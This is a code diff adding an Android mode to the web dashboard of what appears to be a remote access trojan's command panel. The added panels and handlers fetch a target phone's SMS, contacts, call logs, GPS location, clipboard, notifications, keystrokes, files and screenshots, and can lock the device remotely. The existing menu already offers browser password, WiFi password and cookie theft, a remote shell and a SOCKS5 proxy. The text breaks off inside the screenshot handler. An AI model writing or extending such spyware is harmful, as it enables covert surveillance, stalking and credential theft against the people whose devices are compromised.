@@ -233,6 +233,34 @@ body.light #scr-wrap{background:#e4e4e7}
 ::-webkit-scrollbar-track{background:transparent}
 ::-webkit-scrollbar-thumb{background:var(--border2);border-radius:99px}
 
+/* ── Android mode ──────────────────────────────────────────── */
+.android-only{display:none!important}
+.win-only{display:flex}
+body.android-mode .android-only{display:flex!important}
+body.android-mode .win-only{display:none!important}
+#and-badge{display:none;align-items:center;gap:5px;font-size:.68rem;font-weight:700;color:#22c55e;background:rgba(34,197,94,.1);border:1px solid rgba(34,197,94,.25);border-radius:99px;padding:2px 9px}
+body.android-mode #and-badge{display:flex}
+/* Android data cards */
+.and-card{background:var(--surface2);border:1px solid var(--border);border-radius:var(--radius);overflow:hidden;margin-bottom:8px}
+.and-card-hdr{padding:10px 14px;font-size:.72rem;font-weight:700;text-transform:uppercase;letter-spacing:.08em;color:var(--text3);border-bottom:1px solid var(--border)}
+.and-row{display:flex;flex-direction:column;padding:9px 14px;border-bottom:1px solid var(--border);font-size:.82rem;cursor:default}
+.and-row:last-child{border-bottom:none}
+.and-row:hover{background:var(--surface3)}
+.and-row .ar-main{font-weight:500;color:var(--text)}
+.and-row .ar-sub{font-size:.72rem;color:var(--text2);margin-top:2px}
+.and-row .ar-time{font-size:.68rem;color:var(--text3);margin-top:1px}
+/* location card */
+#and-loc-card{background:var(--surface2);border:1px solid var(--border);border-radius:var(--radius);padding:20px;text-align:center;max-width:420px}
+#and-loc-card .coord{font-size:1.4rem;font-weight:700;color:var(--accent2);margin:8px 0}
+#and-loc-card .acc{font-size:.78rem;color:var(--text3)}
+/* notif feed */
+.nf-item{display:flex;gap:10px;padding:9px 14px;border-bottom:1px solid var(--border);align-items:flex-start}
+.nf-pkg{font-size:.62rem;font-weight:700;color:var(--accent2);background:var(--accent-dim);padding:2px 7px;border-radius:4px;flex-shrink:0;white-space:nowrap;margin-top:2px}
+.nf-body{flex:1;min-width:0}
+.nf-title{font-size:.82rem;font-weight:600;color:var(--text)}
+.nf-text{font-size:.75rem;color:var(--text2);margin-top:1px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.nf-time{font-size:.65rem;color:var(--text3);flex-shrink:0;white-space:nowrap;margin-top:3px}
+
 /* ── Responsive ──────────────────────────────────────────── */
 @media(max-width:768px){
   :root{--sidebar:56px}
@@ -265,6 +293,7 @@ body.light #scr-wrap{background:#e4e4e7}
   <div id="conn-pill"><div id="conn-dot"></div><span id="conn-txt">Connecting</span></div>
   <select id="agent-sel"><option value="">Select agent</option></select>
   <div id="fps-pill">-- fps</div>
+  <div id="and-badge">&#x1F4F1; Android</div>
   <button id="theme-btn" title="Toggle theme">&#x1F319;</button>
   <button id="fv-btn" title="Fast View (H.264)" style="display:none;background:var(--accent);color:#fff;border:none;border-radius:8px;padding:6px 14px;font-size:13px;cursor:pointer;font-weight:600;">⚡ Fast View</button>
 </div>
@@ -278,21 +307,22 @@ body.light #scr-wrap{background:#e4e4e7}
     <button class="nav-btn" data-p="mic"><span class="ico">&#x1F399;</span><span>Microphone</span></button>
     <button class="nav-btn" data-p="clip"><span class="ico">&#x1F4CB;</span><span>Clipboard</span></button>
   </div>
-  <div class="nav-grp">
+  <!-- Windows-only nav groups -->
+  <div class="nav-grp win-only" style="flex-direction:column">
     <div class="nav-lbl">Data</div>
     <button class="nav-btn" data-p="kl"><span class="ico">&#x2328;</span><span>Keylogs</span></button>
     <button class="nav-btn" data-p="hist"><span class="ico">&#x1F310;</span><span>History</span></button>
     <button class="nav-btn" data-p="cookie"><span class="ico">&#x1F36A;</span><span>Cookies</span></button>
     <button class="nav-btn" data-p="fm"><span class="ico">&#x1F4C1;</span><span>Files</span></button>
   </div>
-  <div class="nav-grp">
+  <div class="nav-grp win-only" style="flex-direction:column">
     <div class="nav-lbl">System</div>
     <button class="nav-btn" data-p="si"><span class="ico">&#x1F4BB;</span><span>System Info</span></button>
     <button class="nav-btn" data-p="proc"><span class="ico">&#x2699;</span><span>Processes</span></button>
     <button class="nav-btn" data-p="ss"><span class="ico">&#x1F4F8;</span><span>Screenshot</span></button>
     <button class="nav-btn" data-p="rec"><span class="ico">&#x23FA;</span><span>Recording</span></button>
   </div>
-  <div class="nav-grp">
+  <div class="nav-grp win-only" style="flex-direction:column">
     <div class="nav-lbl">Tools</div>
     <button class="nav-btn" data-p="notif"><span class="ico">&#x1F514;</span><span>Notification</span></button>
     <button class="nav-btn" data-p="wall"><span class="ico">&#x1F5BC;</span><span>Wallpaper</span></button>
@@ -303,7 +333,7 @@ body.light #scr-wrap{background:#e4e4e7}
     <button class="nav-btn" data-p="mons"><span class="ico">&#x1F5B5;</span><span>Monitors</span></button>
     <button class="nav-btn" data-p="notes"><span class="ico">&#x1F4DD;</span><span>Notes</span></button>
   </div>
-  <div class="nav-grp">
+  <div class="nav-grp win-only" style="flex-direction:column">
     <div class="nav-lbl">Control</div>
     <button class="nav-btn" data-p="power"><span class="ico">&#x26A1;</span><span>Power</span></button>
     <button class="nav-btn" data-p="rshell"><span class="ico">&#x1F5A5;</span><span>Shell</span></button>
@@ -311,13 +341,13 @@ body.light #scr-wrap{background:#e4e4e7}
     <button class="nav-btn" data-p="winactive"><span class="ico">&#x1FA9F;</span><span>Active Win</span></button>
     <button class="nav-btn" data-p="privacy"><span class="ico">&#x1F512;</span><span>Privacy Screen</span></button>
   </div>
-  <div class="nav-grp">
+  <div class="nav-grp win-only" style="flex-direction:column">
     <div class="nav-lbl">Secrets</div>
     <button class="nav-btn" data-p="wifi"><span class="ico">&#x1F4F6;</span><span>WiFi Passwords</span></button>
     <button class="nav-btn" data-p="bpwd"><span class="ico">&#x1F511;</span><span>Browser Pwds</span></button>
     <button class="nav-btn" data-p="envvars"><span class="ico">&#x1F30D;</span><span>Env Vars</span></button>
   </div>
-  <div class="nav-grp">
+  <div class="nav-grp win-only" style="flex-direction:column">
     <div class="nav-lbl">Recon</div>
     <button class="nav-btn" data-p="drives"><span class="ico">&#x1F4BE;</span><span>Drives</span></button>
     <button class="nav-btn" data-p="fsearch"><span class="ico">&#x1F50D;</span><span>File Search</span></button>
@@ -328,6 +358,31 @@ body.light #scr-wrap{background:#e4e4e7}
     <button class="nav-btn" data-p="lanscan"><span class="ico">&#x1F4E1;</span><span>LAN Scan</span></button>
     <button class="nav-btn" data-p="dnscache"><span class="ico">&#x1F310;</span><span>DNS Cache</span></button>
     <button class="nav-btn" data-p="socks5"><span class="ico">&#x1F9E6;</span><span>SOCKS5 Proxy</span></button>
+  </div>
+
+  <!-- Android-only nav groups -->
+  <div class="nav-grp android-only" style="flex-direction:column">
+    <div class="nav-lbl">Android Data</div>
+    <button class="nav-btn" data-p="and-sms"><span class="ico">&#x1F4AC;</span><span>SMS</span></button>
+    <button class="nav-btn" data-p="and-contacts"><span class="ico">&#x1F465;</span><span>Contacts</span></button>
+    <button class="nav-btn" data-p="and-calllog"><span class="ico">&#x1F4DE;</span><span>Call Logs</span></button>
+    <button class="nav-btn" data-p="and-location"><span class="ico">&#x1F4CD;</span><span>Location</span></button>
+    <button class="nav-btn" data-p="and-wifiinfo"><span class="ico">&#x1F4F6;</span><span>WiFi Info</span></button>
+    <button class="nav-btn" data-p="and-apps"><span class="ico">&#x1F4E6;</span><span>Installed Apps</span></button>
+    <button class="nav-btn" data-p="and-clip"><span class="ico">&#x1F4CB;</span><span>Clipboard</span></button>
+    <button class="nav-btn" data-p="and-fm"><span class="ico">&#x1F4C1;</span><span>Files</span></button>
+  </div>
+  <div class="nav-grp android-only" style="flex-direction:column">
+    <div class="nav-lbl">Android Spy</div>
+    <button class="nav-btn" data-p="and-notifs"><span class="ico">&#x1F514;</span><span>Notifications</span></button>
+    <button class="nav-btn" data-p="and-kl"><span class="ico">&#x2328;</span><span>Keylogger</span></button>
+    <button class="nav-btn" data-p="and-si"><span class="ico">&#x1F4BB;</span><span>System Info</span></button>
+    <button class="nav-btn" data-p="and-proc"><span class="ico">&#x2699;</span><span>Running Apps</span></button>
+    <button class="nav-btn" data-p="and-ss"><span class="ico">&#x1F4F8;</span><span>Screenshot</span></button>
+  </div>
+  <div class="nav-grp android-only" style="flex-direction:column">
+    <div class="nav-lbl">Android Device</div>
+    <button class="nav-btn" data-p="and-lock"><span class="ico">&#x1F512;</span><span>Lock Screen</span></button>
   </div>
 </nav>
 
@@ -919,6 +974,158 @@ Please do not touch the computer.</textarea>
       </div>
 
       <div id="s5-result" style="font-size:.82rem;color:var(--text3);min-height:1.2em"></div>
+    </div>
+  </div>
+
+
+  <!-- ANDROID: SMS -->
+  <div class="panel" id="and-sms">
+    <div class="ph"><h2>&#x1F4AC; SMS Messages</h2><span class="meta" id="and-sms-n">--</span>
+      <button class="act-btn primary" id="and-sms-fetch">Fetch SMS</button>
+      <button class="act-btn" id="and-sms-clear">Clear</button>
+    </div>
+    <div style="padding:8px 20px;border-bottom:1px solid var(--border);flex-shrink:0">
+      <input class="ipt" id="and-sms-q" type="text" placeholder="Filter by number or body..." style="width:100%">
+    </div>
+    <div id="and-sms-list" style="flex:1;overflow-y:auto"></div>
+  </div>
+
+  <!-- ANDROID: Contacts -->
+  <div class="panel" id="and-contacts">
+    <div class="ph"><h2>&#x1F465; Contacts</h2><span class="meta" id="and-contacts-n">--</span>
+      <button class="act-btn primary" id="and-contacts-fetch">Fetch Contacts</button>
+    </div>
+    <div style="padding:8px 20px;border-bottom:1px solid var(--border);flex-shrink:0">
+      <input class="ipt" id="and-contacts-q" type="text" placeholder="Filter contacts..." style="width:100%">
+    </div>
+    <div id="and-contacts-list" style="flex:1;overflow-y:auto"></div>
+  </div>
+
+  <!-- ANDROID: Call Logs -->
+  <div class="panel" id="and-calllog">
+    <div class="ph"><h2>&#x1F4DE; Call Logs</h2><span class="meta" id="and-calllog-n">--</span>
+      <button class="act-btn primary" id="and-calllog-fetch">Fetch Logs</button>
+    </div>
+    <div id="and-calllog-list" style="flex:1;overflow-y:auto"></div>
+  </div>
+
+  <!-- ANDROID: Location -->
+  <div class="panel" id="and-location">
+    <div class="ph"><h2>&#x1F4CD; Location</h2>
+      <button class="act-btn primary" id="and-loc-fetch">Get Location</button>
+    </div>
+    <div class="pbody" style="align-items:center;justify-content:center;gap:14px">
+      <div id="and-loc-card">
+        <div style="font-size:.8rem;color:var(--text3)">Last known GPS location</div>
+        <div class="coord" id="and-loc-coords">--</div>
+        <div class="acc" id="and-loc-acc"></div>
+        <div style="margin-top:12px"><a id="and-loc-link" href="#" target="_blank" style="font-size:.8rem;color:var(--accent2);display:none">&#x1F5FA; Open in Maps</a></div>
+        <div style="font-size:.72rem;color:var(--text3);margin-top:6px" id="and-loc-src"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ANDROID: WiFi Info -->
+  <div class="panel" id="and-wifiinfo">
+    <div class="ph"><h2>&#x1F4F6; WiFi Info</h2>
+      <button class="act-btn primary" id="and-wifi-fetch">Fetch</button>
+    </div>
+    <div class="pbody">
+      <div class="si-grid" id="and-wifi-grid"></div>
+    </div>
+  </div>
+
+  <!-- ANDROID: Installed Apps -->
+  <div class="panel" id="and-apps">
+    <div class="ph"><h2>&#x1F4E6; Installed Apps</h2><span class="meta" id="and-apps-n">--</span>
+      <button class="act-btn primary" id="and-apps-fetch">Fetch Apps</button>
+    </div>
+    <div style="padding:8px 20px;border-bottom:1px solid var(--border);flex-shrink:0">
+      <input class="ipt" id="and-apps-q" type="text" placeholder="Filter apps..." style="width:100%">
+    </div>
+    <div id="and-apps-list" style="flex:1;overflow-y:auto"></div>
+  </div>
+
+  <!-- ANDROID: Clipboard -->
+  <div class="panel" id="and-clip">
+    <div class="ph"><h2>&#x1F4CB; Clipboard</h2>
+      <button class="act-btn primary" id="and-clip-fetch">Read Clipboard</button>
+    </div>
+    <div class="pbody" style="gap:12px">
+      <div id="and-clip-out" style="background:var(--surface2);border:1px solid var(--border);border-radius:var(--radius);padding:14px 16px;font-size:.85rem;min-height:80px;word-break:break-all;color:var(--text2)">Clipboard empty or not fetched yet.</div>
+    </div>
+  </div>
+
+  <!-- ANDROID: File Manager -->
+  <div class="panel" id="and-fm">
+    <div class="ph"><h2>&#x1F4C1; File Manager</h2><span class="meta" id="and-fm-path-lbl">/</span></div>
+    <div id="and-fm-pathbar" style="padding:8px 20px;border-bottom:1px solid var(--border);display:flex;gap:8px;flex-shrink:0">
+      <input class="ipt" id="and-fm-path" type="text" value="/" style="flex:1;font-family:monospace">
+      <button class="act-btn primary" id="and-fm-go">Go</button>
+    </div>
+    <div id="and-fm-list" style="flex:1;overflow-y:auto"></div>
+  </div>
+
+  <!-- ANDROID: Notifications -->
+  <div class="panel" id="and-notifs">
+    <div class="ph"><h2>&#x1F514; Notifications</h2><span class="meta" id="and-notifs-n">0 received</span>
+      <button class="act-btn danger" id="and-notifs-clear">Clear</button>
+    </div>
+    <div id="and-notifs-feed" style="flex:1;overflow-y:auto"></div>
+  </div>
+
+  <!-- ANDROID: Keylogger -->
+  <div class="panel" id="and-kl">
+    <div class="ph"><h2>&#x2328; Keylogger</h2><span class="meta" id="and-kl-n">0 keys</span></div>
+    <div style="padding:8px 20px;display:flex;gap:8px;align-items:center;border-bottom:1px solid var(--border);flex-shrink:0">
+      <button class="act-btn primary" id="and-kl-on">Start</button>
+      <button class="act-btn danger" id="and-kl-off">Stop</button>
+      <button class="act-btn" id="and-kl-clear">Clear</button>
+      <span id="and-kl-status" style="font-size:.75rem;color:var(--text3);margin-left:auto">Stopped</span>
+    </div>
+    <div id="and-kl-feed" style="flex:1;overflow-y:auto;padding:10px 20px;font-family:monospace;font-size:.82rem"></div>
+  </div>
+
+  <!-- ANDROID: System Info -->
+  <div class="panel" id="and-si">
+    <div class="ph"><h2>&#x1F4BB; System Info</h2>
+      <button class="act-btn primary" id="and-si-fetch">Refresh</button>
+    </div>
+    <div class="pbody">
+      <div class="si-grid" id="and-si-grid"></div>
+    </div>
+  </div>
+
+  <!-- ANDROID: Running Apps / Processes -->
+  <div class="panel" id="and-proc">
+    <div class="ph"><h2>&#x2699; Running Apps</h2><span class="meta" id="and-proc-n">--</span>
+      <button class="act-btn primary" id="and-proc-fetch">Refresh</button>
+    </div>
+    <div style="padding:8px 20px;border-bottom:1px solid var(--border);flex-shrink:0">
+      <input class="ipt" id="and-proc-q" type="text" placeholder="Filter apps..." style="width:100%">
+    </div>
+    <div id="and-proc-list" style="flex:1;overflow-y:auto"></div>
+  </div>
+
+  <!-- ANDROID: Screenshot -->
+  <div class="panel" id="and-ss">
+    <div class="ph"><h2>&#x1F4F8; Screenshot</h2>
+      <button class="act-btn primary" id="and-ss-btn">Take Screenshot</button>
+      <button class="act-btn" id="and-ss-dl" style="display:none">&#x2B07; Download</button>
+    </div>
+    <div class="pbody" style="align-items:center;justify-content:center;gap:14px">
+      <div id="and-ss-status" style="color:var(--text3);font-size:.85rem">Press "Take Screenshot" to capture</div>
+      <img id="and-ss-img" src="" style="display:none;max-width:100%;max-height:65vh;border-radius:var(--radius);border:1px solid var(--border)">
+    </div>
+  </div>
+
+  <!-- ANDROID: Lock Screen -->
+  <div class="panel" id="and-lock">
+    <div class="ph"><h2>&#x1F512; Lock Screen</h2></div>
+    <div class="pbody" style="align-items:center;justify-content:center;gap:16px">
+      <div style="text-align:center;color:var(--text3);font-size:.85rem;max-width:280px">Lock the target Android device screen immediately. Device admin permission must be enabled on the target.</div>
+      <button class="act-btn danger" id="and-lock-btn" style="font-size:1rem;padding:12px 32px">&#x1F512; Lock Now</button>
+      <div id="and-lock-status" style="font-size:.8rem;color:var(--text3)"></div>
     </div>
   </div>
 
@@ -2286,6 +2493,323 @@ socket.on("socks5_status_result",d=>{
     else if(e.key.length===1){e.preventDefault();const t=enc.encode(e.key);const b=new Uint8Array(1+t.length);b[0]=4;b.set(t,1);fvSendInput(b);}
   });
 })();
+
+/* ═══════════════════════════════════════════════════════════
+   ANDROID FEATURES
+   ═══════════════════════════════════════════════════════════ */
+
+// ── Platform detection ────────────────────────────────────────
+const _agentPlatform = {}; // name → "android"|"windows"
+
+socket.on("agent_list", list => {
+  list.forEach(a => { _agentPlatform[a.name] = a.platform || "windows"; });
+});
+
+$("agent-sel").addEventListener("change", () => {
+  const p = _agentPlatform[$("agent-sel").value] || "windows";
+  document.body.classList.toggle("android-mode", p === "android");
+  if (p === "android") {
+    // Switch default panel to and-notifs feed so something useful shows
+    // (but only if currently on a Windows-only panel)
+    const cur = document.querySelector(".panel.on");
+    if (cur && cur.id !== "and-notifs" && !cur.id.startsWith("and-")) {
+      showPanel("and-notifs");
+    }
+  }
+}, true); // capture so it runs before the existing listener
+
+// ── Helpers ───────────────────────────────────────────────────
+function andFetch(event, payload) {
+  if (!agent) { toast("No agent selected", "err"); return; }
+  socket.emit(event, { ...payload, _agent: agent, _requester: socket.id });
+}
+function fmt(v, fb) { return (v === undefined || v === null || v === "") ? (fb || "--") : String(v); }
+function ts(ms) {
+  if (!ms || ms < 1000) return "--";
+  const d = new Date(Number(ms));
+  return d.toLocaleString();
+}
+function dur(s) {
+  if (!s) return "0s";
+  const h = Math.floor(s / 3600), m = Math.floor((s % 3600) / 60), sec = s % 60;
+  return (h ? h + "h " : "") + (m ? m + "m " : "") + sec + "s";
+}
+function siCard(label, val, sub, pct) {
+  const fill = pct != null ? `<div class="si-bar"><div class="si-bar-fill" style="width:${Math.min(100,pct)}%;background:${pct>80?"var(--red)":pct>60?"var(--yellow)":"var(--accent)"}"></div></div>` : "";
+  return `<div class="si-card"><div class="label">${label}</div><div class="val">${val}</div>${sub?`<div class="sub">${sub}</div>`:""}${fill}</div>`;
+}
+
+// ── SMS ───────────────────────────────────────────────────────
+let _andSms = [];
+socket.on("sms_result", d => {
+  if (d._agent && d._agent !== agent) return;
+  _andSms = d.sms || [];
+  renderAndSms($("and-sms-q").value);
+  $("and-sms-n").textContent = _andSms.length + " messages";
+  toast("SMS loaded: " + _andSms.length, "ok");
+});
+function renderAndSms(q) {
+  const list = _andSms.filter(m => !q || (m.address||"").includes(q) || (m.body||"").toLowerCase().includes(q.toLowerCase()));
+  $("and-sms-list").innerHTML = list.length ? list.map(m => `
+    <div class="and-row">
+      <div class="ar-main">${fmt(m.address)}</div>
+      <div class="ar-sub">${(m.body||"").replace(/</g,"&lt;")}</div>
+      <div class="ar-time">${ts(m.date)} · ${m.type == 1 ? "Inbox" : m.type == 2 ? "Sent" : "Other"}</div>
+    </div>`).join("") : `<div style="padding:20px;color:var(--text3);text-align:center">No messages</div>`;
+}
+$("and-sms-fetch").onclick = () => andFetch("get_sms", {});
+$("and-sms-clear").onclick = () => { _andSms = []; $("and-sms-list").innerHTML = ""; $("and-sms-n").textContent = "--"; };
+$("and-sms-q").oninput = () => renderAndSms($("and-sms-q").value);
+
+// ── Contacts ──────────────────────────────────────────────────
+let _andContacts = [];
+socket.on("contacts_result", d => {
+  if (d._agent && d._agent !== agent) return;
+  _andContacts = d.contacts || [];
+  renderAndContacts($("and-contacts-q").value);
+  $("and-contacts-n").textContent = _andContacts.length + " contacts";
+  toast("Contacts loaded: " + _andContacts.length, "ok");
+});
+function renderAndContacts(q) {
+  const list = _andContacts.filter(c => !q || (c.name||"").toLowerCase().includes(q.toLowerCase()) || (c.phone||"").includes(q));
+  $("and-contacts-list").innerHTML = list.length ? list.map(c => `
+    <div class="and-row">
+      <div class="ar-main">${fmt(c.name)}</div>
+      <div class="ar-sub">${fmt(c.phone)}</div>
+      ${c.email ? `<div class="ar-time">${c.email}</div>` : ""}
+    </div>`).join("") : `<div style="padding:20px;color:var(--text3);text-align:center">No contacts</div>`;
+}
+$("and-contacts-fetch").onclick = () => andFetch("get_contacts", {});
+$("and-contacts-q").oninput = () => renderAndContacts($("and-contacts-q").value);
+
+// ── Call Logs ─────────────────────────────────────────────────
+const _clType = {1:"Incoming",2:"Outgoing",3:"Missed",5:"Rejected"};
+socket.on("call_logs_result", d => {
+  if (d._agent && d._agent !== agent) return;
+  const logs = d.call_logs || [];
+  $("and-calllog-n").textContent = logs.length + " entries";
+  $("and-calllog-list").innerHTML = logs.length ? logs.map(l => `
+    <div class="and-row">
+      <div class="ar-main">${fmt(l.number)}</div>
+      <div class="ar-sub">${_clType[l.type]||"Unknown"} · ${dur(l.duration)}</div>
+      <div class="ar-time">${ts(l.date)}</div>
+    </div>`).join("") : `<div style="padding:20px;color:var(--text3);text-align:center">No call logs</div>`;
+  toast("Call logs: " + logs.length, "ok");
+});
+$("and-calllog-fetch").onclick = () => andFetch("get_call_logs", {});
+
+// ── Location ──────────────────────────────────────────────────
+socket.on("location_result", d => {
+  if (d._agent && d._agent !== agent) return;
+  if (d.error) { $("and-loc-coords").textContent = "Error: " + d.error; return; }
+  $("and-loc-coords").textContent = (d.lat||0).toFixed(6) + ", " + (d.lng||0).toFixed(6);
+  $("and-loc-acc").textContent = "Accuracy: " + fmt(d.accuracy ? Math.round(d.accuracy) + " m" : null, "--");
+  $("and-loc-src").textContent = "Source: " + fmt(d.source) + " · " + ts(d.time);
+  const lnk = $("and-loc-link");
+  if (d.maps_url) { lnk.href = d.maps_url; lnk.style.display = "inline"; }
+  toast("Location received", "ok");
+});
+$("and-loc-fetch").onclick = () => andFetch("get_location", {});
+
+// ── WiFi Info ─────────────────────────────────────────────────
+socket.on("wifi_info_result", d => {
+  if (d._agent && d._agent !== agent) return;
+  const g = $("and-wifi-grid");
+  g.innerHTML = [
+    siCard("SSID", fmt(d.ssid)),
+    siCard("BSSID", fmt(d.bssid)),
+    siCard("IP Address", fmt(d.ip)),
+    siCard("Signal (RSSI)", fmt(d.rssi != null ? d.rssi + " dBm" : null)),
+    siCard("Link Speed", fmt(d.link_speed_mbps != null ? d.link_speed_mbps + " Mbps" : null)),
+    siCard("Connected", d.connected ? "Yes" : "No"),
+    siCard("Network Type", fmt(d.network_type)),
+  ].join("");
+  toast("WiFi info received", "ok");
+});
+$("and-wifi-fetch").onclick = () => andFetch("get_wifi_info", {});
+
+// ── Installed Apps ────────────────────────────────────────────
+let _andApps = [];
+socket.on("installed_apps_result", d => {
+  if (d._agent && d._agent !== agent) return;
+  _andApps = d.apps || [];
+  renderAndApps($("and-apps-q").value);
+  $("and-apps-n").textContent = _andApps.length + " apps";
+  toast("Apps loaded: " + _andApps.length, "ok");
+});
+function renderAndApps(q) {
+  const list = _andApps.filter(a => !q || (a.name||"").toLowerCase().includes(q.toLowerCase()) || (a.package||"").toLowerCase().includes(q.toLowerCase()));
+  $("and-apps-list").innerHTML = list.length ? list.map(a => `
+    <div class="and-row">
+      <div class="ar-main">${fmt(a.name)}</div>
+      <div class="ar-sub" style="font-family:monospace;font-size:.72rem">${fmt(a.package)}</div>
+      <div class="ar-time">v${fmt(a.version)}</div>
+    </div>`).join("") : `<div style="padding:20px;color:var(--text3);text-align:center">No apps</div>`;
+}
+$("and-apps-fetch").onclick = () => andFetch("get_installed_apps", {});
+$("and-apps-q").oninput = () => renderAndApps($("and-apps-q").value);
+
+// ── Clipboard ─────────────────────────────────────────────────
+socket.on("clipboard_content_result", d => {
+  if (d._agent && d._agent !== agent) return;
+  $("and-clip-out").textContent = d.text || "(empty)";
+  toast("Clipboard read", "ok");
+});
+$("and-clip-fetch").onclick = () => andFetch("get_clipboard_content", {});
+
+// ── File Manager (Android) ────────────────────────────────────
+socket.on("dir_result", d => {
+  if (d._agent && d._agent !== agent) return;
+  if (!document.getElementById("and-fm").classList.contains("on")) return;
+  const list = $("and-fm-list");
+  const entries = d.entries || [];
+  $("and-fm-path-lbl").textContent = d.path || "/";
+  $("and-fm-path").value = d.path || "/";
+  if (d.error) { list.innerHTML = `<div style="padding:14px 20px;color:var(--red)">${d.error}</div>`; return; }
+  list.innerHTML = entries.length ? entries.map(e => `
+    <div class="fm-r" data-path="${(e.path||"").replace(/"/g,"&quot;")}" data-dir="${e.type==="dir"?1:0}">
+      <span class="ic">${e.type==="dir"?"📁":"📄"}</span>
+      <span class="nm">${e.name||e.path}</span>
+      <span class="sz">${e.size != null ? (e.size < 1024 ? e.size+"B" : e.size < 1048576 ? (e.size/1024).toFixed(1)+"KB" : (e.size/1048576).toFixed(1)+"MB") : ""}</span>
+    </div>`).join("") : `<div style="padding:14px 20px;color:var(--text3)">Empty directory</div>`;
+  list.querySelectorAll(".fm-r").forEach(r => {
+    r.onclick = () => {
+      if (r.dataset.dir === "1") { andFetch("list_dir", { path: r.dataset.path }); }
+      else { andFetch("read_file", { path: r.dataset.path }); }
+    };
+  });
+});
+socket.on("file_data", d => {
+  if (d._agent && d._agent !== agent) return;
+  if (!document.getElementById("and-fm").classList.contains("on")) return;
+  if (d.error) { toast("Read error: " + d.error, "err"); return; }
+  const content = d.content || atob(d.data || "");
+  const blob = new Blob([content], { type: "text/plain" });
+  const a = document.createElement("a");
+  a.href = URL.createObjectURL(blob);
+  a.download = (d.path || "file").split("/").pop();
+  a.click();
+  toast("File downloaded", "ok");
+});
+$("and-fm-go").onclick = () => andFetch("list_dir", { path: $("and-fm-path").value });
+document.getElementById("and-fm-path").addEventListener("keydown", e => { if (e.key === "Enter") $("and-fm-go").click(); });
+
+// ── Notifications ─────────────────────────────────────────────
+let _andNotifCount = 0;
+socket.on("notification_event", d => {
+  if (d._agent && d._agent !== agent) return;
+  _andNotifCount++;
+  $("and-notifs-n").textContent = _andNotifCount + " received";
+  const feed = $("and-notifs-feed");
+  const item = document.createElement("div");
+  item.className = "nf-item";
+  item.innerHTML = `
+    <span class="nf-pkg">${(d.package||"?").split(".").pop()}</span>
+    <div class="nf-body">
+      <div class="nf-title">${(d.title||"").replace(/</g,"&lt;")}</div>
+      <div class="nf-text">${(d.text||"").replace(/</g,"&lt;")}</div>
+    </div>
+    <span class="nf-time">${ts(d.time)}</span>`;
+  feed.insertBefore(item, feed.firstChild);
+});
+$("and-notifs-clear").onclick = () => { $("and-notifs-feed").innerHTML = ""; _andNotifCount = 0; $("and-notifs-n").textContent = "0 received"; };
+
+// ── Keylogger (Android) ───────────────────────────────────────
+let _andKlKeys = 0;
+// Keylog chars arrive on the same "key" event as Windows — just filtered by agent
+socket.on("key", d => {
+  if (d._agent !== agent) return;
+  if (!document.body.classList.contains("android-mode")) return; // let Windows handler take it
+  _andKlKeys++;
+  $("and-kl-n").textContent = _andKlKeys + " keys";
+  const feed = $("and-kl-feed");
+  const sp = document.createElement("span");
+  const ch = d.char || "";
+  if (ch === "[DEL]") { sp.className = "kl-bs"; sp.textContent = "⌫"; }
+  else if (ch === "\n") { sp.className = "kl-sp"; sp.textContent = "↵\n"; }
+  else if (ch.startsWith("[FOCUS:")) { sp.style.cssText = "display:block;color:var(--accent2);font-size:.7rem;margin-top:6px"; sp.textContent = "▶ " + ch.slice(7, -1); }
+  else { sp.textContent = ch; }
+  feed.appendChild(sp);
+  feed.scrollTop = feed.scrollHeight;
+});
+socket.on("keylog_status", d => {
+  if (d._agent && d._agent !== agent) return;
+  $("and-kl-status").textContent = d.enabled ? "Running" : "Stopped";
+  $("and-kl-status").style.color = d.enabled ? "var(--green)" : "var(--text3)";
+});
+$("and-kl-on").onclick = () => andFetch("keylog_on", {});
+$("and-kl-off").onclick = () => andFetch("keylog_off", {});
+$("and-kl-clear").onclick = () => { $("and-kl-feed").innerHTML = ""; _andKlKeys = 0; $("and-kl-n").textContent = "0 keys"; };
+
+// ── System Info (Android) ─────────────────────────────────────
+socket.on("sysinfo_result", d => {
+  if (d._agent && d._agent !== agent) return;
+  if (!document.body.classList.contains("android-mode")) return;
+  const g = $("and-si-grid");
+  g.innerHTML = [
+    siCard("Device", fmt(d.device || d.model)),
+    siCard("Android", fmt(d.android_version || d.os_version)),
+    siCard("Manufacturer", fmt(d.manufacturer)),
+    siCard("SDK", fmt(d.sdk)),
+    siCard("Battery", fmt(d.battery != null ? d.battery + "%" : null), null, d.battery),
+    siCard("RAM", fmt(d.ram_free ? Math.round(d.ram_free/1048576)+"MB free / "+Math.round(d.ram_total/1048576)+"MB" : null)),
+    siCard("Storage", fmt(d.storage_free ? Math.round(d.storage_free/1073741824*10)/10+"GB free / "+Math.round(d.storage_total/1073741824*10)/10+"GB" : null)),
+    siCard("IMEI", fmt(d.imei)),
+    siCard("Phone", fmt(d.phone)),
+    siCard("Carrier", fmt(d.carrier || d.network_operator)),
+  ].join("");
+  toast("System info received", "ok");
+});
+$("and-si-fetch").onclick = () => andFetch("get_sysinfo", {});
+
+// ── Running Apps (Android) ────────────────────────────────────
+let _andProcs = [];
+socket.on("processes_result", d => {
+  if (d._agent && d._agent !== agent) return;
+  if (!document.body.classList.contains("android-mode")) return;
+  _andProcs = d.processes || [];
+  renderAndProcs($("and-proc-q").value);
+  $("and-proc-n").textContent = _andProcs.length + " apps";
+  toast("Running apps: " + _andProcs.length, "ok");
+});
+function renderAndProcs(q) {
+  const list = _andProcs.filter(p => !q || (p.name||"").toLowerCase().includes(q.toLowerCase()) || (p.package||"").toLowerCase().includes(q.toLowerCase()));
+  $("and-proc-list").innerHTML = list.length ? list.map(p => `
+    <div class="and-row">
+      <div class="ar-main">${fmt(p.name)}</div>
+      <div class="ar-sub" style="font-family:monospace;font-size:.72rem">${fmt(p.package)}</div>
+    </div>`).join("") : `<div style="padding:20px;color:var(--text3);text-align:center">No apps</div>`;
+}
+$("and-proc-fetch").onclick = () => andFetch("get_processes", {});
+$("and-proc-q").oninput = () => renderAndProcs($("and-proc-q").value);
+
+// ── Screenshot (Android) ──────────────────────────────────────
+socket.on("screenshot_result", d => {
+  if (d._agent && d._agent !== agent) return;
+  if (!document.body.classList.contains("android-mode")) return;
+  const img = $("and-ss-img");
+  img.src = "data:image/jpeg;base64," + d.data;
+  img.style.display = "block";
+  $("and-ss-status").style.display = "none";
+  $("and-ss-dl").style.display = "";
+  $("and-ss-dl").onclick = () => {
+    const a = document.createElement("a");
